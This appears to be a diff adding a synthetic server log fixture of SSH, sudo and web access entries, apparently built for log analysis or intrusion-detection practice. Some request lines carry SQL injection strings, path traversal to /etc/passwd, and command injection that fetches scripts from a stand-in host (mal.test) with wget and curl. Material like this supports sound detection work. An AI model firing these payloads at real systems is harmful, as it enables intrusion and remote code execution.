@@ -1,0 +1,116 @@
+Aug  4 09:12:01 server1 systemd[1]: Starting Daily apt download activities...
+Aug  4 09:12:02 server1 systemd[1]: Finished Daily apt download activities.
+192.168.1.55 - - [04/Aug/2025:09:13:20 +0000] "GET / HTTP/1.1" 200 842 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+192.168.1.55 - - [04/Aug/2025:09:13:21 +0000] "GET /styles.css HTTP/1.1" 200 3120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+Aug  4 09:14:33 server1 sshd[3101]: Accepted publickey for alice from 192.168.1.30 port 51220 ssh2: RSA SHA256:XYZ
+203.0.113.7 - - [04/Aug/2025:09:15:01 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "http://example.com/" "Mozilla/5.0"
+198.51.100.10 - - [04/Aug/2025:09:16:10 +0000] "GET /robots.txt HTTP/1.1" 200 68 "-" "Mozilla/5.0"
+Aug  4 09:17:22 server1 sudo:     carol : TTY=pts/1 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update
+192.0.2.10 - - [04/Aug/2025:09:18:01 +0000] "GET /about HTTP/1.1" 200 1543 "-" "Mozilla/5.0"
+192.0.2.10 - - [04/Aug/2025:09:18:02 +0000] "GET /img/logo.png HTTP/1.1" 200 20480 "-" "Mozilla/5.0"
+Aug  4 09:19:12 server1 sshd[3110]: Failed password for invalid user admin from 203.0.113.7 port 49812 ssh2
+Aug  4 09:19:15 server1 sshd[3110]: Failed password for invalid user admin from 203.0.113.7 port 49812 ssh2
+Aug  4 09:19:18 server1 sshd[3110]: Failed password for invalid user admin from 203.0.113.7 port 49812 ssh2
+203.0.113.44 - - [04/Aug/2025:09:20:03 +0000] "GET /wp-login.php HTTP/1.1" 404 230 "-" "Mozilla/5.0"
+203.0.113.44 - - [04/Aug/2025:09:20:04 +0000] "GET /.git/config HTTP/1.1" 404 230 "-" "Mozilla/5.0"
+203.0.113.44 - - [04/Aug/2025:09:20:05 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 230 "-" "Mozilla/5.0"
+203.0.113.44 - - [04/Aug/2025:09:20:06 +0000] "GET /admin HTTP/1.1" 403 150 "-" "Mozilla/5.0"
+Aug  4 09:21:33 server1 crontab[3200]: (bob) LIST (bob)
+192.0.2.33 - - [04/Aug/2025:09:22:11 +0000] "GET /api/status HTTP/1.1" 200 64 "-" "curl/7.68.0"
+192.0.2.33 - - [04/Aug/2025:09:22:11 +0000] "GET /secret HTTP/1.1" 401 120 "-" "curl/7.68.0"
+192.0.2.33 - - [04/Aug/2025:09:22:12 +0000] "GET /secret HTTP/1.1" 401 120 "-" "curl/7.68.0"
+192.0.2.33 - - [04/Aug/2025:09:22:13 +0000] "GET /secret HTTP/1.1" 401 120 "-" "curl/7.68.0"
+203.0.113.90 - - [04/Aug/2025:09:23:55 +0000] "GET /index.html HTTP/1.1" 200 860 "-" "python-requests/2.31.0"
+Aug  4 09:24:02 server1 sudo:     bob : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+198.51.100.22 - - [04/Aug/2025:09:24:40 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0"
+198.51.100.22 - - [04/Aug/2025:09:24:41 +0000] "OPTIONS /api HTTP/1.1" 200 0 "-" "Mozilla/5.0"
+198.51.100.22 - - [04/Aug/2025:09:24:42 +0000] "TRACE / HTTP/1.1" 405 0 "-" "Mozilla/5.0"
+Aug  4 09:25:12 server1 sshd[3230]: Accepted password for david from 172.16.2.55 port 52018 ssh2
+203.0.113.200 - - [04/Aug/2025:09:26:03 +0000] "GET /?id=1%20UNION%20SELECT%201,2,3 HTTP/1.1" 200 420 "-" "Mozilla/5.0"
+203.0.113.200 - - [04/Aug/2025:09:26:05 +0000] "GET /product?id=1' OR '1'='1 HTTP/1.1" 200 420 "-" "Mozilla/5.0"
+203.0.113.200 - - [04/Aug/2025:09:26:06 +0000] "GET /search?q=%27%20OR%201%3D1%20-- HTTP/1.1" 200 420 "-" "Mozilla/5.0"
+192.0.2.45 - - [04/Aug/2025:09:27:11 +0000] "GET /health HTTP/1.1" 200 16 "-" "kube-probe/1.28"
+Aug  4 09:28:33 server1 su[3350]: (to root) alice on pts/4
+Aug  4 09:28:34 server1 su[3350]: pam_unix(su:session): session opened for user root by alice(uid=1002)
+192.0.2.60 - - [04/Aug/2025:09:29:10 +0000] "GET /login HTTP/1.1" 200 900 "-" "Mozilla/5.0"
+192.0.2.60 - - [04/Aug/2025:09:29:11 +0000] "POST /login HTTP/1.1" 302 0 "/login" "Mozilla/5.0"
+Aug  4 09:30:41 server1 sshd[3401]: Failed password for root from 45.76.32.11 port 50221 ssh2
+Aug  4 09:30:44 server1 sshd[3401]: Failed password for root from 45.76.32.11 port 50221 ssh2
+Aug  4 09:30:47 server1 sshd[3401]: Failed password for root from 45.76.32.11 port 50221 ssh2
+203.0.113.250 - - [04/Aug/2025:09:31:00 +0000] "GET /server-status HTTP/1.1" 403 150 "-" "Mozilla/5.0"
+203.0.113.250 - - [04/Aug/2025:09:31:01 +0000] "GET /.env HTTP/1.1" 404 230 "-" "Mozilla/5.0"
+203.0.113.250 - - [04/Aug/2025:09:31:02 +0000] "GET /config.php HTTP/1.1" 404 230 "-" "Mozilla/5.0"
+192.0.2.70 - - [04/Aug/2025:09:31:50 +0000] "GET /docs HTTP/1.1" 301 0 "-" "Mozilla/5.0"
+192.0.2.70 - - [04/Aug/2025:09:31:51 +0000] "GET /docs/ HTTP/1.1" 200 2200 "-" "Mozilla/5.0"
+Aug  4 10:01:12 server1 nginx[3500]: 10.0.1.45 - - [04/Aug/2025:10:01:12 +0000] "POST /upload HTTP/1.1" 200 512
+192.0.2.80 - - [04/Aug/2025:10:05:00 +0000] "GET /index.php?/etc/passwd HTTP/1.1" 404 230 "-" "sqlmap/1.7"
+192.0.2.80 - - [04/Aug/2025:10:05:01 +0000] "GET /wp-admin HTTP/1.1" 301 0 "-" "sqlmap/1.7"
+192.0.2.80 - - [04/Aug/2025:10:05:02 +0000] "GET /wp-admin/ HTTP/1.1" 403 150 "-" "sqlmap/1.7"
+203.0.113.99 - - [04/Aug/2025:10:06:33 +0000] "GET /?cmd=%3Bwget%20http://mal.test/x.sh HTTP/1.1" 200 420 "-" "Mozilla/5.0"
+198.51.100.45 - - [04/Aug/2025:10:10:12 +0000] "PUT /api/user/5 HTTP/1.1" 200 64 "-" "Mozilla/5.0"
+198.51.100.45 - - [04/Aug/2025:10:10:13 +0000] "DELETE /api/user/5 HTTP/1.1" 403 150 "-" "Mozilla/5.0"
+Aug  4 10:12:40 server1 sudo:     frank : TTY=pts/3 ; PWD=/home/frank ; USER=root ; COMMAND=/usr/sbin/service apache2 restart
+Aug  4 10:15:01 server1 CRON[3601]: (root) CMD (run-parts /etc/cron.hourly)
+192.0.2.95 - - [04/Aug/2025:10:16:20 +0000] "GET /search?q=notebook HTTP/1.1" 200 640 "-" "Mozilla/5.0"
+192.0.2.96 - - [04/Aug/2025:10:17:01 +0000] "GET /login HTTP/1.1" 200 900 "-" "Mozilla/5.0"
+192.0.2.96 - - [04/Aug/2025:10:17:05 +0000] "POST /login HTTP/1.1" 401 120 "/login" "Mozilla/5.0"
+192.0.2.96 - - [04/Aug/2025:10:17:07 +0000] "POST /login HTTP/1.1" 401 120 "/login" "Mozilla/5.0"
+192.0.2.96 - - [04/Aug/2025:10:17:10 +0000] "POST /login HTTP/1.1" 401 120 "/login" "Mozilla/5.0"
+Aug  4 10:18:22 server1 sshd[3650]: Accepted password for oscar from 192.168.100.10 port 42345 ssh2
+Aug  4 10:19:03 server1 sshd[3655]: Failed password for root from 77.88.99.11 port 52112 ssh2
+Aug  4 10:19:06 server1 sshd[3655]: Failed password for root from 77.88.99.11 port 52112 ssh2
+Aug  4 10:19:09 server1 sshd[3655]: Failed password for root from 77.88.99.11 port 52112 ssh2
+203.0.113.150 - - [04/Aug/2025:10:20:20 +0000] "GET /api/admin HTTP/1.1" 403 150 "-" "Mozilla/5.0"
+203.0.113.150 - - [04/Aug/2025:10:20:21 +0000] "GET /admin HTTP/1.1" 403 150 "-" "Mozilla/5.0"
+203.0.113.150 - - [04/Aug/2025:10:20:22 +0000] "GET /admin/config.php HTTP/1.1" 404 230 "-" "Mozilla/5.0"
+Aug  4 10:21:44 server1 su[3701]: (to root) bob on pts/5
+Aug  4 10:21:45 server1 su[3701]: pam_unix(su:session): session opened for user root by bob(uid=1001)
+192.0.2.100 - - [04/Aug/2025:10:22:55 +0000] "GET /static/app.js HTTP/1.1" 200 12034 "-" "Mozilla/5.0"
+192.0.2.100 - - [04/Aug/2025:10:22:56 +0000] "GET /static/app.css HTTP/1.1" 200 9032 "-" "Mozilla/5.0"
+Aug  4 10:25:12 server1 sshd[3750]: Failed password for invalid user test from 203.0.113.90 port 50012 ssh2
+Aug  4 10:25:15 server1 sshd[3750]: Failed password for invalid user test from 203.0.113.90 port 50012 ssh2
+Aug  4 10:25:18 server1 sshd[3750]: Failed password for invalid user test from 203.0.113.90 port 50012 ssh2
+203.0.113.210 - - [04/Aug/2025:10:26:33 +0000] "GET /?file=../../../../etc/passwd HTTP/1.1" 200 420 "-" "Mozilla/5.0"
+198.51.100.60 - - [04/Aug/2025:10:27:12 +0000] "GET /api/v1/users HTTP/1.1" 200 256 "-" "Mozilla/5.0"
+198.51.100.60 - - [04/Aug/2025:10:27:13 +0000] "PATCH /api/v1/users/12 HTTP/1.1" 200 64 "-" "Mozilla/5.0"
+Aug  4 22:01:13 server1 sshd[4101]: Failed password for root from 185.220.101.5 port 50055 ssh2
+Aug  4 22:01:16 server1 sshd[4101]: Failed password for root from 185.220.101.5 port 50055 ssh2
+Aug  4 22:01:19 server1 sshd[4101]: Failed password for root from 185.220.101.5 port 50055 ssh2
+Aug  4 22:01:22 server1 sshd[4101]: Failed password for root from 185.220.101.5 port 50055 ssh2
+Aug  4 22:02:40 server1 sudo:     testuser : TTY=pts/9 ; PWD=/tmp ; USER=root ; COMMAND=/bin/rm -rf /tmp/*
+Aug  4 22:04:05 server1 su[4120]: (to root) mallory on pts/7
+Aug  4 22:04:06 server1 su[4120]: pam_unix(su:session): session opened for user root by mallory(uid=1004)
+203.0.113.5 - - [04/Aug/2025:22:05:00 +0000] "GET /login HTTP/1.1" 200 900 "-" "Mozilla/5.0"
+203.0.113.5 - - [04/Aug/2025:22:05:05 +0000] "POST /login HTTP/1.1" 401 120 "/login" "Mozilla/5.0"
+203.0.113.5 - - [04/Aug/2025:22:05:08 +0000] "POST /login HTTP/1.1" 401 120 "/login" "Mozilla/5.0"
+203.0.113.5 - - [04/Aug/2025:22:05:12 +0000] "POST /login HTTP/1.1" 200 0 "/login" "Mozilla/5.0"
+192.0.2.150 - - [04/Aug/2025:22:06:33 +0000] "GET /wp-login.php HTTP/1.1" 404 230 "-" "nikto/2.5.0"
+192.0.2.150 - - [04/Aug/2025:22:06:34 +0000] "GET /.git/HEAD HTTP/1.1" 404 230 "-" "nikto/2.5.0"
+192.0.2.150 - - [04/Aug/2025:22:06:35 +0000] "GET /admin HTTP/1.1" 403 150 "-" "nikto/2.5.0"
+Aug  4 22:07:41 server1 sshd[4150]: Accepted password for eve from 192.168.2.45 port 41222 ssh2
+Aug  4 22:07:41 server1 sshd[4150]: Accepted password for eve from 192.168.2.45 port 41222 ssh2
+198.51.100.77 - - [04/Aug/2025:22:08:10 +0000] "GET /admin HTTP/1.1" 403 150 "-" "python-requests/2.31.0"
+198.51.100.77 - - [04/Aug/2025:22:08:11 +0000] "GET /admin/config.php HTTP/1.1" 404 230 "-" "python-requests/2.31.0"
+Aug  4 22:09:33 server1 sshd[4160]: Failed password for root from 66.249.66.1 port 49115 ssh2
+Aug  4 22:09:36 server1 sshd[4160]: Failed password for root from 66.249.66.1 port 49115 ssh2
+Aug  4 22:09:39 server1 sshd[4160]: Failed password for root from 66.249.66.1 port 49115 ssh2
+203.0.113.55 - - [04/Aug/2025:22:10:01 +0000] "GET /?q=%60id%60 HTTP/1.1" 200 420 "-" "Mozilla/5.0"
+203.0.113.55 - - [04/Aug/2025:22:10:02 +0000] "GET /?q=$()(curl%20http://mal.test/p.sh) HTTP/1.1" 200 420 "-" "Mozilla/5.0"
+Aug  5 03:41:12 server1 vsftpd[2420]: CONNECT: Client "203.0.113.99"
+Aug  5 03:41:14 server1 vsftpd[2420]: FAIL LOGIN: Client "203.0.113.99", User "anonymous"
+Aug  5 03:41:16 server1 vsftpd[2420]: FAIL LOGIN: Client "203.0.113.99", User "admin"
+Aug  5 02:12:01 server1 systemd[1]: Starting logrotate.service...
+Aug  5 02:12:01 server1 systemd[1]: Finished logrotate.service.
+192.0.2.200 - - [05/Aug/2025:02:13:10 +0000] "GET /api/data HTTP/1.1" 500 320 "-" "Mozilla/5.0"
+192.0.2.200 - - [05/Aug/2025:02:13:12 +0000] "GET /api/data HTTP/1.1" 502 280 "-" "Mozilla/5.0"
+192.0.2.200 - - [05/Aug/2025:02:13:13 +0000] "GET /api/data HTTP/1.1" 503 300 "-" "Mozilla/5.0"
+192.0.2.200 - - [05/Aug/2025:02:13:14 +0000] "GET /api/data HTTP/1.1" 500 310 "-" "Mozilla/5.0"
+192.0.2.200 - - [05/Aug/2025:02:13:16 +0000] "GET /api/data HTTP/1.1" 503 298 "-" "Mozilla/5.0"
+198.51.100.88 - - [05/Aug/2025:02:45:01 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0"
+198.51.100.88 - - [05/Aug/2025:02:45:03 +0000] "OPTIONS /login HTTP/1.1" 200 0 "-" "Mozilla/5.0"
+198.51.100.88 - - [05/Aug/2025:02:45:04 +0000] "TRACE /admin HTTP/1.1" 405 0 "-" "Mozilla/5.0"
+198.51.100.88 - - [05/Aug/2025:02:45:06 +0000] "CONNECT example.com:443 HTTP/1.1" 200 0 "-" "Mozilla/5.0"
+203.0.113.222 - - [05/Aug/2025:03:22:10 +0000] "DELETE /api/user/77 HTTP/1.1" 403 120 "-" "Mozilla/5.0"
+203.0.113.222 - - [05/Aug/2025:03:22:11 +0000] "PATCH /api/user/77 HTTP/1.1" 403 140 "-" "Mozilla/5.0"
+
+
